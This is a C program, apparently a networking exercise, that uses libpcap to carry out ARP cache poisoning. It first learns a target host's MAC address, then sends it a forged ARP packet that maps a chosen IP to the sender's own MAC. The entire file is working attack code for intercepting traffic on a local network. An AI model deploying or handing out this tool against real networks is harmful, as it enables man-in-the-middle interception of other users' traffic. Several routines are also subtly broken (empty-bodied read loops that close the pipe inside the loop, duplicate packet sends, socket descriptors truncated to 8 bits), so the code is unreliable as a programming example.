#include <pcap.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#define ETHER_ADDR_LEN 6
#define IP_LEN 4
#define ARP_LEN 42
#define ARPOP_REQUEST 0x01
#define ARPOP_REPLY 0x02
#define ARPHRD_ETHER 0X01
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP  0X0806

struct ethernet_hdr
        {
          u_int8_t ether_dhost[ETHER_ADDR_LEN];
          u_int8_t ether_shost[ETHER_ADDR_LEN];
          u_int16_t ether_type;
        };

struct arp_hdr
        {
          u_int16_t HardwareType;
          u_int16_t ProtocolType;
          u_int8_t HardwareSize;
          u_int8_t ProtocolSize;
          u_int16_t Opcode;
          u_int8_t SenderMacAdd[ETHER_ADDR_LEN];
          u_int8_t SenderIpAdd[IP_LEN];
          u_int8_t TargetMacAdd[ETHER_ADDR_LEN];
          u_int8_t TargetIpAdd[IP_LEN];
        };

/*int get_my_macadd(const char *dev, u_int8_t *mac)
{
  int sock=socket(AF_INET,SOCK_DGRAM,0);
  struct ifreq ifr;
  memset(&ifr,0X00,sizeof(ifr));
  strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
  int fd=socket(AF_INET,SOCK_DGRAM,0);
  if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
    perror("ioctl ");
  mac=(u_int8_t *)ifr.ifr_hwaddr.sa_data;
  close(sock);

  char buf[100];
  FILE *fp;
  fp=popen("ifconfig eth0 | grep 'HWaddr ' | awk '{ print $5}'","r");
  if(fp==NULL)
    return -1;
  while(fgets(buf,sizeof(buf),fp))

  pclose(fp);
  sscanf(buf,"%u:%u:%u:%u:%u:%u",mac,mac+1,mac+2,mac+3,mac+4,mac+5);
  for(int i=0;i<6;i++)
  {
    printf("%X ",mac[i]);
  }
}*/

int get_my_ipadd(const char *dev, u_int8_t *ip)
{
  char buf[100];
  FILE *fp;
  fp=popen("hostname -I","r");
  if(fp==NULL)
    return -1;
  while(fgets(buf,sizeof(buf),fp))

  pclose(fp);
  sscanf(buf,"%u.%u.%u.%u",ip,ip+1,ip+2,ip+3);

  return 0;
}

int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send_ip, u_int8_t *target_ip, u_int8_t *buf,int request_flag)
{
  struct ethernet_hdr *ether=(struct ethernet_hdr *)buf;
  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    ether->ether_dhost[i]=dst_mac[i];
    ether->ether_shost[i]=src_mac[i];
  }
  ether->ether_type=htons(ETHERTYPE_ARP);
  arp->HardwareType=htons(ARPHRD_ETHER);
  arp->ProtocolType=htons(ETHERTYPE_IP);
  arp->HardwareSize=ETHER_ADDR_LEN;
  arp->ProtocolSize=IP_LEN;
  arp->Opcode=htons(ARPOP_REQUEST);

  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    arp->SenderMacAdd[i]=src_mac[i];
    (request_flag==0)?(arp->TargetMacAdd[i]=0x00):(arp->TargetMacAdd[i]=dst_mac[i]);
  }

  for(u_int8_t i=0;i<IP_LEN;i++)
  {
    arp->SenderIpAdd[i]=send_ip[i];
    arp->TargetIpAdd[i]=target_ip[i];
  }

  pcap_sendpacket(handle,buf,ARP_LEN);
  
  printf("success\n");
  if(pcap_sendpacket(handle,buf,ARP_LEN)==-1)
  {
	printf("ARP request fail");
	return -1;
  }

  return 1;
}
 
int recv_reply(pcap_t *handle,u_int8_t *target_ip,u_int8_t *victim_mac)
{
  int reply_flag=0;

  for(u_int8_t i=0;;i++)
  {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    struct ethernet_hdr *ether=(struct ethernet_hdr *)packet;
   
    if(htons(ether->ether_type)==ETHERTYPE_ARP)
    {
	  struct arp_hdr *arp=(struct arp_hdr *)(ether+1);
	  if(arp->Opcode==htons(ARPOP_REPLY))
	  {
		if((arp->SenderIpAdd[0]==target_ip[0]) && (arp->SenderIpAdd[1]==target_ip[1]) && (arp->SenderIpAdd[2]==target_ip[2]) && (arp->SenderIpAdd[3]==target_ip[3]))
		{
		  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
		  victim_mac[i]=arp->SenderMacAdd[i];
		}
		  reply_flag=1;
	  }
    }
    
    if(reply_flag==1)
    {
      printf("SMA:%X:%X:%X:%X:%X:%X\n",victim_mac[0],victim_mac[1],victim_mac[2],victim_mac[3],victim_mac[4],victim_mac[5]);
      break;
    }
  }

  return 1;
}

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp eth0 172.20.10.5 172.20.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }
  int request_flag=0;
  u_int8_t broadcastmac[ETHER_ADDR_LEN]={0XFF,0XFF,0XFF,0XFF,0XFF,0XFF};
  u_int8_t my_mac[ETHER_ADDR_LEN];
  u_int8_t my_ip[IP_LEN];
  u_int8_t victim_mac[ETHER_ADDR_LEN];
  u_int8_t sender_ip[IP_LEN];
  u_int8_t target_ip[IP_LEN];
  u_int8_t buf[ARP_LEN];
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  inet_pton(AF_INET,argv[2],sender_ip);
  inet_pton(AF_INET,argv[3],target_ip);
  //get_my_macadd(dev,my_mac);
  get_my_ipadd(dev,my_ip);
  
  u_int8_t sock=socket(AF_INET,SOCK_DGRAM,0);
  struct ifreq ifr;
  memset(&ifr,0X00,sizeof(ifr));
  strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
  u_int8_t fd=socket(AF_INET,SOCK_DGRAM,0);
  if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
    perror("ioctl ");
  for(int i=0;i<6;i++)
  my_mac[i]=(u_int8_t)ifr.ifr_hwaddr.sa_data[i];
  close(sock);

  send_req(handle,my_mac,broadcastmac,my_ip,target_ip,buf,request_flag);
  recv_reply(handle,target_ip,victim_mac);
  request_flag=1;
  send_req(handle,my_mac,victim_mac,sender_ip,target_ip,buf,request_flag);
  pcap_close(handle);
  return 0;
}
